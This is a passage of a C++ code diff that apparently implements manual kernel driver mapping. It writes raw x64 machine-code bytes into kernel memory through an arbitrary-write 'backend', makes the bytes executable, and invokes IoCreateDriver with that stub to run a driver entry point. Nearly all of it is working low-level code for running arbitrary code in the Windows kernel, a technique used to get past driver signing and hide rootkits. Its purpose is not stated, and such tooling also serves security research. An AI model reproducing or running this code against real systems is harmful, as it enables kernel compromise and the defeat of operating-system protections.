+    std::memcpy(callback.data() + p, &driverEntryVa, sizeof(driverEntryVa)); p += 8;
+    callback[p++] = 0xFF; callback[p++] = 0xD0;
+    // mov rdx, capture; mov [rdx+8], rax; ret
+    callback[p++] = 0x48; callback[p++] = 0xBA;
+    std::memcpy(callback.data() + p, &captureVa, sizeof(captureVa)); p += 8;
+    callback[p++] = 0x48; callback[p++] = 0x89; callback[p++] = 0x42; callback[p++] = 0x08;
+    callback[p++] = 0xC3;
+    if (!backend->WriteKernelMemory(callbackVa, callback.data(), p)) {
+        const auto captureFree = FreeKernelMemory(backend, captureVa);
+        const auto callbackFree = FreeKernelMemory(backend, callbackVa);
+        if (captureFree != KernelCallStatus::Executed ||
+            callbackFree != KernelCallStatus::Executed)
+            result.callStatus = KernelCallStatus::RestorationUncertain;
+        return result;
+    }
+    bool protectedCallback = false;
+    const auto protect = ProtectKernelMemory(backend, callbackVa, 0x40,
+                                             PAGE_EXECUTE_READ, &protectedCallback);
+    if (protect != KernelCallStatus::Executed || !protectedCallback) {
+        const auto captureFree = protect == KernelCallStatus::RestorationUncertain
+            ? KernelCallStatus::RestorationUncertain
+            : FreeKernelMemory(backend, captureVa);
+        KernelCallStatus callbackFree = KernelCallStatus::Executed;
+        if (protect != KernelCallStatus::RestorationUncertain &&
+            (protect == KernelCallStatus::NotExecuted || !protectedCallback))
+            callbackFree = FreeKernelMemory(backend, callbackVa);
+        if (captureFree != KernelCallStatus::Executed ||
+            callbackFree != KernelCallStatus::Executed)
+            result.callStatus = KernelCallStatus::RestorationUncertain;
+        return result;
+    }
+
+    result.callbackStub = callbackVa;
+    uint32_t ioStatus = STATUS_UNSUCCESSFUL;
+    result.callStatus = CallKernelFunction(backend, &ioStatus, ioCreateDriver,
+                                           0ULL, callbackVa);
+    result.ioCreateStatus = ioStatus;
+    if (result.callStatus != KernelCallStatus::Executed) return result;
+
+    uint64_t capturedObject = 0;
+    uint32_t capturedStatus = STATUS_UNSUCCESSFUL;
+    if (!ReadU64(backend, captureVa, capturedObject) ||
+        !ReadU32(backend, captureVa + 8, capturedStatus)) {
+        result.callStatus = KernelCallStatus::RestorationUncertain;
+        return result;
+    }
+    result.driverObject = capturedObject;
+    result.driverEntryStatus = capturedStatus;
+    // The callback stub remains resident because DRIVER_OBJECT.DriverInit may
+    // retain its address after IoCreateDriver returns. The capture slot is no
+    // longer referenced and can be released after a confirmed call.
+    const auto captureFree = FreeKernelMemory(backend, captureVa);
+    if (captureFree != KernelCallStatus::Executed)
+        result.callStatus = KernelCallStatus::RestorationUncertain;
+    return result;
 }
 
 } // namespace kmem
